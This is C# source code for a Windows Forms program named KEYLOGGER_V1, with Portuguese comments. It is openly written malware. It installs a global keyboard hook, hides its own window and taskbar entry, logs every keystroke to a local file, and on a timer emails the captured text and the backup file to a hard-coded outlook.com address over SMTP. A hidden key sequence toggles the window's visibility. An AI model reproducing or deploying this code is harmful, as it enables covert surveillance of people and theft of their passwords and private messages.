using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;

namespace KEYLOGGER_V1
{
    public partial class FormularioPrincipal : Form
    {
        int conta;
        string[] names = new string[3];

        //istanciar Class Caputura de Teclas
        globalKeyboardHook gkh = new globalKeyboardHook();
        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }
        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            txtTextoDigitado.Text += GerenciamentoDeCaracteres(Convert.ToString(e.KeyCode));
        }
        public FormularioPrincipal()
        {
            InitializeComponent();
        }
        public FormularioPrincipal(bool visibilidade)
        {
            //InitializeComponent();
            if (visibilidade == true)
            {
                visivel();
            }
        }
        private void FrmHome_Load(object sender, EventArgs e)
        {   //deixa o formulario Invisivel
            invisivel();
            MetodosDeEventosHook();
            if (Verifica_backup() == true)
            {
                if (Habilitar_web() == true)
                {   // enviar backup para email
                    EnviarEmailBackup(@"C:\Key\Keylogger.txt");
                    //deleta backup

                }

            }

        }
        void invisivel()
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;
        }
        public void visivel()
        {
            this.Opacity = 100;
            this.ShowInTaskbar = true;
        }
        void MetodosDeEventosHook()
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
        }
        bool Verifica_backup()
        {

            if (File.Exists(@"C:\Key\Keylogger.txt"))
            {
                return true;
            }
            else
            {
                return false;
            }

        }
        private void tmEnviarEmail_Tick(object sender, EventArgs e)
        {
            BackupOrEmail();
        }

        [DllImport("wininet.dll")]

        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue);
        bool Habilitar_web()
        {
            bool result;

            try
            {

                int Description;

                result = InternetGetConnectedState(out Description, 0);

            }

            catch
            {
                // MessageBox.Show("Esta sem Internet!!");
                result = false;

            }

            return result;
        }
        void EnviarEmail(String Texto)
        {

            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
            Email.From = (new MailAddress("OrionOficial@outlook.com"));
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Body = Texto;
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("", "");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }
            //MessageBox.Show("Email enviado com sucesso!!", "Email - Enviado!");
            txtTextoDigitado.Clear();

        }
        void EnviarEmailBackup(String DirBackup)
        {
            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
            Email.From = (new MailAddress("OrionOficial@outlook.com"));
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Attachments.Add(new Attachment(DirBackup));
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("", "");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }
            //MessageBox.Show("Backup enviado com sucesso!!", "Email - Enviado!");

        }
        void criarBackup(String DirBackup)
        {

            StreamWriter SW = new StreamWriter(DirBackup, true);
            SW.Write(txtTextoDigitado.Text);
            SW.Close();
            txtTextoDigitado.Clear();
            // MessageBox.Show("Criado backup com sucesso!");
        }
        void BackupOrEmail()
        {

            if (Habilitar_web() == true)
            {
                if (txtTextoDigitado.Text != "")
                {
                    EnviarEmail(txtTextoDigitado.Text);
                }


            }
            else
            {

                criarBackup(@"C:\Key\Keylogger.txt");

            }
        }
        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
        {
            File.Delete(@"C:\Key\Keylogger.txt");
            if (txtTextoDigitado.Text != "")
            {
                criarBackup(@"C:\Key\Keylogger.txt");
            }

        }
        String GerenciamentoDeCaracteres(String Key)
        {

            switch (Key)
            {

                case "LWin":

                    return "[Win]";
                    break;
                case "LControlKey":

                    return "[Ctrl]";
                case "RControlKey":

                    return "[Ctrl]";
                    break;
                case "LMenu":

                    return "[Alt]";
                    break;
                case "RMenu":

                    return "[Alt]";
                    break;
                case "Return":

                    return "[Enter]";
                    break;
                case "Space":

                    return "[Space]";
                    break;
                case "LShiftKey":

                    return "[Shift]";
                    break;
                case "RShiftKey":

                    return "[Shift]";
                    break;
                case "Capital":

                    return "[Caps Lock]";
                    break;
                case "Tab":

                    return "[Tab]";
                    break;
                case "Oemtilde":

                    return "'";
                    break;
                case "Escape":

                    return "[Esc]";
                    break;
                case "Back":

                    return "[Back]";
                    break;
                case "PrintScreen":

                    return "[Print Screen]";
                    break;
                case "Pause":

                    return "[Pause Break]";
                    break;
                case "Insert":

                    return "[Insert]";
                    break;
                case "Delete":

                    return "[Delete]";
                    break;
                case "Home":

                    return "[Home]";
                    break;
                case "PageUp":

                    return "[Page Up]";
                    break;
                case "Next":

                    return "[Page Down]";
                    break;
                case "End":

                    return "[End]";
                    break;
                case "Apps":

                    return "[Menu]";
                    break;
                case "Up":

                    return "[Up]";
                    break;
                case "Down":

                    return "[Down]";
                    break;
                case "Right":

                    return "[Right]";
                    break;
                case "Left":

                    return "[Left]";
                    break;
                case "Oemplus":

                    return "=";
                    break;
                case "OemMinus":

                    return "-";
                    break;
                case "Oem6":

                    return "[";
                    break;
                case "Oem5":
                    return "]";
                    break;
                case "Oem7":

                    return "";
                    break;
                case "OemOpenBrackets":

                    return "´";
                    break;
                case "Oem1":

                    return "Ç";
                    break;
                case "Oemcomma":

                    return ",";
                    break;
                case "OemPeriod":

                    return ".";
                    break;
                case "OemQuestion":

                    return ";";
                    break;
                case "D1":

                    return "1";
                    break;
                case "D2":

                    return "2";
                    break;
                case "D3":

                    return "3";
                    break;
                case "D4":

                    return "4";
                    break;
                case "D5":

                    return "5";
                    break;
                case "D6":

                    return "6";
                    break;
                case "D7":

                    return "7";
                    break;
                case "D8":

                    return "8";
                    break;
                case "D9":

                    return "9";
                    break;
                case "D0":

                    return "0";
                    break;
                case "F1":

                    return "[F1]";
                    break;
                case "F2":

                    return "[F2]";
                    break;
                case "F3":

                    return "[F3]";
                    break;
                case "F4":

                    return "[F4]";
                    break;
                case "F5":

                    return "[F5]";
                    break;
                case "F6":

                    return "[F6]";
                    break;
                case "F7":

                    return "[F7]";
                    break;
                case "F8":

                    return "[F8]";
                    break;
                case "F9":

                    return "[F9]";
                    break;
                case "F10":

                    return "[F10]";
                    break;
                case "F11":

                    return "[F11]";
                    break;
                case "F12":

                    return "[F12]";
                    break;


                default:

                    return Key;
            }


        }
        private void FrmHome_KeyPress(object sender, KeyPressEventArgs e)
        {

        }
        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)
        {
            String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento

            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter)
            {
                if (this.Opacity == 0 && this.ShowInTaskbar == false)
                {
                    visivel();

                }
                else
                {

                    invisivel();

                }
            }
        }
        String teclaDeVisibilidade(String texto, String caracter)
        {

            int contCarac = caracter.Length;
            int contText = texto.Length;

            if (contText >= contCarac)
            {
                int result = contText - contCarac;
                String caracteres = texto.Substring(result, contCarac);
                return caracteres;
            }
            else
            {
                return texto;
            }


        }
    }
}
